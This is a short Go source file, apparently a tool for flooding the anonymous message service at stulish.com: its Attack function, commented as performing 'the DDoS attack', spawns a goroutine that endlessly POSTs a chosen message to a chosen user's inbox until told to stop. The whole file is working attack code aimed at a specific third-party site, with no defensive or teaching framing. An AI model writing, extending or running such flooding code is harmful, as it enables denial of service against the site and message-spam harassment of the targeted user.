package stulish

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"unicode/utf8"
)

// EndPoint holds the API URL for sending messages.
const EndPoint = "http://stulish.com/Home/sendMess"

// Payload holds request data structure for sending message.
type Payload struct {
	PUserName string `json:"pUserName"`
	PContent  string `json:"pContent"`
}

// ResponseData holds response data structure.
type ResponseData struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

// Attack performs the DDoS attack.
func Attack(username, message string) (chan int, error) {
	if utf8.RuneCountInString(username) == 0 {
		return nil, errors.New("stulish username is not specified")
	}

	if utf8.RuneCountInString(message) == 0 {
		return nil, errors.New("message is not specified")
	}

	c := make(chan int)

	go func() {
		for {
			select {
			case <-c:
				return
			default:
				reqPayload := Payload{
					PUserName: username,
					PContent:  message,
				}
				sendMessage(reqPayload)
			}
		}
	}()

	return c, nil
}

func sendMessage(payload Payload) error {
	reqData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(EndPoint, "application/json; charset=utf-8", strings.NewReader(string(reqData)))
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("couldn't send message")
	}

	resBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	resp.Body.Close()

	var resData ResponseData
	err = json.Unmarshal(resBody, &resData)
	if err != nil {
		return err
	}

	if resData.Code != 1 {
		return fmt.Errorf("couldn't send message")
	}

	return nil
}
